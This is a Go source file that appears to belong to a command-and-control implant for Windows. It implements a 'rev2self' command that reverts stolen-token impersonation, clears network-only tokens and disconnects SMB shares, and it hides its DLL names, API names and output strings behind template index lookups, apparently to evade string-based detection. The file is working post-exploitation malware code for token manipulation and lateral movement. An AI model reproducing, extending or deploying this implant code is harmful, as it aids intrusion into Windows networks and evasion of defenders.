// server/docker/payloads/Windows/actin_rev2self_windows.go
//go:build windows
// +build windows

package main

import (
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"
)

var (
	// Lazy DLL/proc variables (initialized in init)
	modmpr                    *syscall.LazyDLL
	procWNetCancelConnection2 *syscall.LazyProc
	procWNetOpenEnum          *syscall.LazyProc
	procWNetEnumResource      *syscall.LazyProc
	procWNetCloseEnum         *syscall.LazyProc
	procWNetGetConnection     *syscall.LazyProc

	// Track network resources accessed with network-only tokens
	networkResourceTracker = &NetworkResourceTracker{
		resources: make(map[string]bool),
	}
)

// Rev2self template indices (must match server's common.go)
const (
	idxR2sArgAll       = 521
	idxR2sUncPrefix    = 522
	idxR2sBackslash    = 523
	idxR2sIpcSuffix    = 524
	idxR2sUnknown      = 525
	idxR2sNewline      = 526
	idxR2sNoImperson   = 527
	idxR2sCurUser      = 528
	idxR2sImpReverted  = 529
	idxR2sWas          = 530
	idxR2sNow          = 531
	idxR2sNetOnlyClr   = 532
	idxR2sDisconnected = 533
	idxR2sNetConns     = 534
	idxR2sSharePrefix  = 535
	idxR2sAndMore      = 536
	idxR2sMore         = 537
	idxR2sNoNetConns   = 538
	idxR2sSmbCache     = 539
	idxR2sTokensStored = 540
	idxR2sTokensSuffix = 541
	// DLL/API names
	idxR2sMprDll          = 542
	idxR2sWNetCancelConn2 = 543
	idxR2sWNetOpenEnum    = 544
	idxR2sWNetEnumRes     = 545
	idxR2sWNetCloseEnum   = 546
	idxR2sWNetGetConn     = 547
)

// Rev2self convenience functions using shared tokTpl() from action_token_windows.go
func r2sArgAll() string { return tokTpl(idxR2sArgAll) }

func r2sUncPrefix() string { return tokTpl(idxR2sUncPrefix) }

func r2sBackslash() string { return tokTpl(idxR2sBackslash) }

func r2sIpcSuffix() string { return tokTpl(idxR2sIpcSuffix) }

func r2sUnknown() string { return tokTpl(idxR2sUnknown) }

func r2sNewline() string { return tokTpl(idxR2sNewline) }

func r2sNoImperson() string { return tokTpl(idxR2sNoImperson) }

func r2sCurUser() string { return tokTpl(idxR2sCurUser) }

func r2sImpReverted() string { return tokTpl(idxR2sImpReverted) }

func r2sWas() string { return tokTpl(idxR2sWas) }

func r2sNow() string { return tokTpl(idxR2sNow) }

func r2sNetOnlyClr() string { return tokTpl(idxR2sNetOnlyClr) }

func r2sDisconnected() string { return tokTpl(idxR2sDisconnected) }

func r2sNetConns() string { return tokTpl(idxR2sNetConns) }

func r2sSharePrefix() string { return tokTpl(idxR2sSharePrefix) }

func r2sAndMore() string { return tokTpl(idxR2sAndMore) }

func r2sMore() string { return tokTpl(idxR2sMore) }

func r2sNoNetConns() string { return tokTpl(idxR2sNoNetConns) }

func r2sSmbCache() string { return tokTpl(idxR2sSmbCache) }

func r2sTokensStored() string { return tokTpl(idxR2sTokensStored) }

func r2sTokensSuffix() string { return tokTpl(idxR2sTokensSuffix) }

// DLL/API name helper functions using template lookups
func r2sMprDll() string { return tokTpl(idxR2sMprDll) }

func r2sWNetCancelConn2() string { return tokTpl(idxR2sWNetCancelConn2) }

func r2sWNetOpenEnumW() string { return tokTpl(idxR2sWNetOpenEnum) }

func r2sWNetEnumRes() string { return tokTpl(idxR2sWNetEnumRes) }

func r2sWNetCloseEnumW() string { return tokTpl(idxR2sWNetCloseEnum) }

func r2sWNetGetConn() string { return tokTpl(idxR2sWNetGetConn) }

func init() {
	modmpr = syscall.NewLazyDLL(r2sMprDll())
	procWNetCancelConnection2 = modmpr.NewProc(r2sWNetCancelConn2())
	procWNetOpenEnum = modmpr.NewProc(r2sWNetOpenEnumW())
	procWNetEnumResource = modmpr.NewProc(r2sWNetEnumRes())
	procWNetCloseEnum = modmpr.NewProc(r2sWNetCloseEnumW())
	procWNetGetConnection = modmpr.NewProc(r2sWNetGetConn())
}

// Windows constants for WNet functions
const (
	RESOURCE_CONNECTED  = 0x00000001
	RESOURCE_GLOBALNET  = 0x00000002
	RESOURCE_REMEMBERED = 0x00000003

	RESOURCETYPE_ANY   = 0x00000000
	RESOURCETYPE_DISK  = 0x00000001
	RESOURCETYPE_PRINT = 0x00000002

	RESOURCEUSAGE_CONNECTABLE   = 0x00000001
	RESOURCEUSAGE_CONTAINER     = 0x00000002
	RESOURCEUSAGE_NOLOCALDEVICE = 0x00000004
	RESOURCEUSAGE_SIBLING       = 0x00000008
	RESOURCEUSAGE_ATTACHED      = 0x00000010

	RESOURCEDISPLAYTYPE_GENERIC = 0x00000000
	RESOURCEDISPLAYTYPE_DOMAIN  = 0x00000001
	RESOURCEDISPLAYTYPE_SERVER  = 0x00000002
	RESOURCEDISPLAYTYPE_SHARE   = 0x00000003

	ERROR_NO_MORE_ITEMS = 259
	ERROR_NOT_CONNECTED = 2250
)

// NETRESOURCE structure for Windows networking APIs
type NETRESOURCE struct {
	Scope       uint32
	Type        uint32
	DisplayType uint32
	Usage       uint32
	LocalName   *uint16
	RemoteName  *uint16
	Comment     *uint16
	Provider    *uint16
}

type NetworkResourceTracker struct {
	mu        sync.RWMutex
	resources map[string]bool
}

// TrackNetworkResource adds a network path to the tracker
func (nrt *NetworkResourceTracker) TrackNetworkResource(path string) {
	if !strings.HasPrefix(path, r2sUncPrefix()) {
		return
	}

	nrt.mu.Lock()
	defer nrt.mu.Unlock()

	// Extract the server/share from the path
	// e.g., \\server\share\folder\file -> \\server\share
	parts := strings.Split(path[2:], r2sBackslash())
	if len(parts) >= 2 {
		resource := r2sUncPrefix() + parts[0] + r2sBackslash() + parts[1]
		if !nrt.resources[resource] {
			nrt.resources[resource] = true
		}
	} else if len(parts) >= 1 {
		// Just server, track IPC$ connection
		resource := r2sUncPrefix() + parts[0] + r2sIpcSuffix()
		if !nrt.resources[resource] {
			nrt.resources[resource] = true
		}
	}
}

// GetTrackedResources returns all tracked network resources
func (nrt *NetworkResourceTracker) GetTrackedResources() []string {
	nrt.mu.RLock()
	defer nrt.mu.RUnlock()

	resources := make([]string, 0, len(nrt.resources))
	for resource := range nrt.resources {
		resources = append(resources, resource)
	}
	return resources
}

// ClearTrackedResources clears the tracked resources
func (nrt *NetworkResourceTracker) ClearTrackedResources() {
	nrt.mu.Lock()
	defer nrt.mu.Unlock()
	nrt.resources = make(map[string]bool)
}

// WNetCancelConnection2 disconnects a network resource
func WNetCancelConnection2(name string, flags uint32, force bool) error {
	namePtr, err := syscall.UTF16PtrFromString(name)
	if err != nil {
		return err
	}

	var forceFlag uint32
	if force {
		forceFlag = 1
	}

	ret, _, lastErr := procWNetCancelConnection2.Call(
		uintptr(unsafe.Pointer(namePtr)),
		uintptr(flags),
		uintptr(forceFlag),
	)

	if ret != 0 {
		// Check if it's just "not connected" error
		if ret == ERROR_NOT_CONNECTED {
			return nil // Not an error, just not connected
		}
		return lastErr
	}
	return nil
}

// EnumerateNetworkConnections uses WNetOpenEnum/WNetEnumResource to list connections
func EnumerateNetworkConnections() []string {
	connections := []string{}

	var handle syscall.Handle
	ret, _, _ := procWNetOpenEnum.Call(
		uintptr(RESOURCE_CONNECTED),
		uintptr(RESOURCETYPE_ANY),
		0,
		0,
		uintptr(unsafe.Pointer(&handle)),
	)

	if ret != 0 {
		return connections
	}
	defer procWNetCloseEnum.Call(uintptr(handle))

	// Prepare buffer for enumeration
	const bufferSize = 16384
	buffer := make([]byte, bufferSize)

	for {
		count := uint32(0xFFFFFFFF) // Request as many as possible
		size := uint32(bufferSize)

		ret, _, _ := procWNetEnumResource.Call(
			uintptr(handle),
			uintptr(unsafe.Pointer(&count)),
			uintptr(unsafe.Pointer(&buffer[0])),
			uintptr(unsafe.Pointer(&size)),
		)

		if ret == ERROR_NO_MORE_ITEMS {
			break
		}

		if ret != 0 {
			break
		}

		// Parse the NETRESOURCE structures
		offset := uintptr(0)
		for i := uint32(0); i < count; i++ {
			if offset >= uintptr(size) {
				break
			}

			nr := (*NETRESOURCE)(unsafe.Pointer(&buffer[offset]))

			// Get the remote name
			if nr.RemoteName != nil {
				remoteName := syscall.UTF16ToString((*[1024]uint16)(unsafe.Pointer(nr.RemoteName))[:])
				if strings.HasPrefix(remoteName, r2sUncPrefix()) {
					connections = append(connections, remoteName)
				}
			}

			offset += unsafe.Sizeof(NETRESOURCE{})
		}
	}

	return connections
}

// DisconnectTrackedNetworkResources disconnects only tracked network resources
func DisconnectTrackedNetworkResources() []string {
	disconnected := []string{}
	resources := networkResourceTracker.GetTrackedResources()

	for _, resource := range resources {
		// Try different disconnection strategies

		// First try normal disconnection
		err := WNetCancelConnection2(resource, 0, true)
		if err == nil {
			disconnected = append(disconnected, resource)
			continue
		}

		// Try with CONNECT_UPDATE_PROFILE flag (1)
		err = WNetCancelConnection2(resource, 1, true)
		if err == nil {
			disconnected = append(disconnected, resource)
			continue
		}

		// Try the IPC$ share specifically
		if !strings.HasSuffix(resource, r2sIpcSuffix()) {
			// Extract server name and try IPC$
			if idx := strings.Index(resource[2:], r2sBackslash()); idx > 0 {
				server := resource[:idx+2]
				ipcPath := server + r2sIpcSuffix()
				err = WNetCancelConnection2(ipcPath, 0, true)
				if err == nil {
				}
			}
		}
	}

	// Clear the tracker after disconnecting
	networkResourceTracker.ClearTrackedResources()

	return disconnected
}

// DisconnectAllNetworkConnections uses Windows APIs to disconnect all connections
func DisconnectAllNetworkConnections() []string {
	disconnected := []string{}

	// Get all current connections
	connections := EnumerateNetworkConnections()

	for _, conn := range connections {
		err := WNetCancelConnection2(conn, 0, true)
		if err == nil {
			disconnected = append(disconnected, conn)
		}
	}

	return disconnected
}

// Rev2SelfCommand handles reverting impersonation
type Rev2SelfCommand struct{}

func (c *Rev2SelfCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	// Get current user info before reverting
	beforeUser, beforeDomain := c.getCurrentUserInfo()

	// Track what we're going to clear
	var hadNetOnlyToken bool
	var netOnlyTokenName string
	var disconnectedShares []string

	// Check what we have BEFORE calling RevertToSelf
	if globalTokenStore != nil {
		globalTokenStore.mu.RLock()
		if globalTokenStore.NetOnlyToken != "" {
			hadNetOnlyToken = true
			netOnlyTokenName = globalTokenStore.NetOnlyToken
		}
		globalTokenStore.mu.RUnlock()
	}

	// If we had a network-only token, disconnect network connections
	if hadNetOnlyToken {

		// Try to disconnect tracked resources first
		disconnectedShares = DisconnectTrackedNetworkResources()

		// If requested or no tracked resources, disconnect all
		if len(args) > 0 && args[0] == r2sArgAll() {
			// User explicitly wants to disconnect all
			allDisconnected := DisconnectAllNetworkConnections()
			for _, share := range allDisconnected {
				// Add only if not already in list
				found := false
				for _, existing := range disconnectedShares {
					if existing == share {
						found = true
						break
					}
				}
				if !found {
					disconnectedShares = append(disconnectedShares, share)
				}
			}
		}
	}

	// Call Windows API to revert impersonation
	err := RevertToSelf()
	if err != nil {
		return CommandResult{
			Output:      ErrCtx(E42, err.Error()),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Get user info after reverting
	afterUser, afterDomain := c.getCurrentUserInfo()

	// Clean up stored state in context
	if ctx != nil && ctx.TokenStore != nil {
		ctx.mu.Lock()
		if tokenStore, ok := ctx.TokenStore.(*UnifiedTokenStore); ok {
			tokenStore.mu.Lock()
			tokenStore.IsImpersonating = false
			tokenStore.ActiveToken = ""

			// Clear network-only token reference
			if tokenStore.NetOnlyToken != "" {
				tokenStore.NetOnlyToken = ""
				tokenStore.NetOnlyHandle = 0
			}
			tokenStore.mu.Unlock()
		}
		ctx.mu.Unlock()
	}

	// Clean up global token store
	if globalTokenStore != nil {
		globalTokenStore.mu.Lock()
		globalTokenStore.IsImpersonating = false
		globalTokenStore.ActiveToken = ""

		// Clear network-only token reference
		if globalTokenStore.NetOnlyToken != "" {
			globalTokenStore.NetOnlyToken = ""
			globalTokenStore.NetOnlyHandle = 0
		}
		globalTokenStore.mu.Unlock()
	}

	// Build output
	var output string
	if beforeUser == afterUser && beforeDomain == afterDomain && !hadNetOnlyToken {
		output = r2sNoImperson() + r2sNewline() + r2sCurUser() + afterDomain + r2sBackslash() + afterUser
	} else {
		output = Succ(S14) + r2sNewline()

		// Report on regular impersonation if it was active
		if beforeUser != afterUser || beforeDomain != afterDomain {
			output += r2sImpReverted()
			output += r2sWas() + beforeDomain + r2sBackslash() + beforeUser + r2sNewline()
			output += r2sNow() + afterDomain + r2sBackslash() + afterUser + r2sNewline()
		}

		// Report on network-only token if it was active
		if hadNetOnlyToken {
			output += r2sNetOnlyClr() + netOnlyTokenName + r2sNewline()

			// Report disconnected shares if any
			if len(disconnectedShares) > 0 {
				output += r2sDisconnected() + strconv.Itoa(len(disconnectedShares)) + r2sNetConns()
				// Show disconnected resources
				for i, share := range disconnectedShares {
					if i < 5 {
						output += r2sSharePrefix() + share + r2sNewline()
					}
				}
				if len(disconnectedShares) > 5 {
					output += r2sAndMore() + strconv.Itoa(len(disconnectedShares)-5) + r2sMore()
				}
			} else if hadNetOnlyToken {
				output += r2sNoNetConns()
				output += r2sSmbCache()
			}
		}
	}

	// Add note about stored tokens
	if globalTokenStore != nil {
		globalTokenStore.mu.RLock()
		tokenCount := len(globalTokenStore.Tokens)
		globalTokenStore.mu.RUnlock()

		if tokenCount > 0 {
			output += r2sTokensStored() + strconv.Itoa(tokenCount) + r2sTokensSuffix()
		}
	}

	return CommandResult{
		Output:      output,
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

// Helper functions
func (c *Rev2SelfCommand) getCurrentUserInfo() (string, string) {
	// Try to get from current thread token first (impersonation)
	var threadToken syscall.Token
	err := OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, true, &threadToken)
	if err == nil {
		defer threadToken.Close()
		return c.getTokenUserInfo(syscall.Handle(threadToken))
	}

	// Fall back to process token
	token, err := syscall.OpenCurrentProcessToken()
	if err == nil {
		defer token.Close()
		return c.getTokenUserInfo(syscall.Handle(token))
	}

	return r2sUnknown(), r2sUnknown()
}

func (c *Rev2SelfCommand) getTokenUserInfo(token syscall.Handle) (string, string) {
	var needed uint32
	procGetTokenInformation.Call(
		uintptr(token),
		1, // TokenUser
		0,
		0,
		uintptr(unsafe.Pointer(&needed)),
	)

	if needed == 0 {
		return r2sUnknown(), ""
	}

	buffer := make([]byte, needed)
	ret, _, _ := procGetTokenInformation.Call(
		uintptr(token),
		1, // TokenUser
		uintptr(unsafe.Pointer(&buffer[0])),
		uintptr(needed),
		uintptr(unsafe.Pointer(&needed)),
	)

	if ret == 0 {
		return r2sUnknown(), ""
	}

	tokenUser := (*TokenUser)(unsafe.Pointer(&buffer[0]))

	var nameSize, domainSize uint32 = 256, 256
	nameBuffer := make([]uint16, nameSize)
	domainBuffer := make([]uint16, domainSize)
	var use uint32

	ret, _, _ = procLookupAccountSidW.Call(
		0,
		uintptr(unsafe.Pointer(tokenUser.User.Sid)),
		uintptr(unsafe.Pointer(&nameBuffer[0])),
		uintptr(unsafe.Pointer(&nameSize)),
		uintptr(unsafe.Pointer(&domainBuffer[0])),
		uintptr(unsafe.Pointer(&domainSize)),
		uintptr(unsafe.Pointer(&use)),
	)

	if ret == 0 {
		return r2sUnknown(), ""
	}

	return syscall.UTF16ToString(nameBuffer), syscall.UTF16ToString(domainBuffer)
}
